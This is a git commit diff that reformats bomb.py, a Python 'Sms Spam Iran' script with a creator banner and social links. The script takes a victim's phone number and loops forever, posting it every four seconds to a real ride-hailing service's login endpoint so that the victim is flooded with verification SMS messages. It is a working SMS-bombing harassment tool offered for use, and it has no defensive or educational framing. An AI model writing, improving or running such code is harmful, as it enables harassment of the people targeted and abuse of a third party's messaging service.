a6a191c331a8cd4076e334342f4d3834f40629ee
creator-serkhio <97538268+creator-serkhio@users.noreply.github.com>
2022-01-11 19:38:24 +0330

    Update bomb.py

--- bomb.py
+++ bomb.py
@@ -1,20 +1,34 @@
-print(""" ___ ___ ___ ___ _ ___
- __ _ ___ (_-</ _ \/ _ `/ ' \ (_
--</ ' \(_-</___/ .__/\_,_/_/_/_/
- /___/_/_/_/___/ /_/ # Sms Spam Iran #C
-reator : Milad RanjbarWebSite : CyberAm
+print("""                                
+  ___ ___  ___ ___ _    ___ __ _  ___
+ (_-</ _ \/ _ `/  ' \  (_-</  ' \(_-<
+/___/ .__/\_,_/_/_/_/ /___/_/_/_/___/
+   /_/                               
 
-ooz.ComTelegram : t.me/CyberAmoozI
-nstagram : instagram.com/CyberAmoo
-z.......................
-.............""") 
+# Sms Spam Iran #
+
+Creator : Milad Ranjbar
+WebSite : CyberAmooz.Com
+Telegram : t.me/CyberAmooz
+Instagram : instagram.com/CyberAmooz
+....................................
+""")
+
 import requests
-import time 
-try: print("Note : For Exit Tools ==> Ctrl + C \n") 
-NumberPhone = input("Enter Number Phone (ex: 9170000000) = ")
- if NumberPhone == "" : print("\n[!] Please Enter Phone Number") 
-else : url = "https://app.snapp.taxi/login/?redirect_to=%2F" 
-data = {"cellphone":"+98" + NumberPhone}
- while True: requests.post(url,data=data)
- print("[+] Send SMS For Victim") 
-time.sleep(4)except: print("\n[-] You Exit Tools !!")
+import time
+
+try:
+    print("Note : For Exit Tools ==> Ctrl + C \n")
+    NumberPhone = input("Enter Number Phone (ex: 9170000000) = ")
+
+    if NumberPhone == "" :
+        print("\n[!] Please Enter Phone Number")
+    else :
+        url = "https://app.snapp.taxi/login/?redirect_to=%2F"
+        data = {"cellphone":"+98" + NumberPhone}
+
+    while True:
+        requests.post(url,data=data)
+        print("[+] Send SMS For Victim")
+        time.sleep(4)
+except:
+    print("\n[-] You Exit Tools !!")
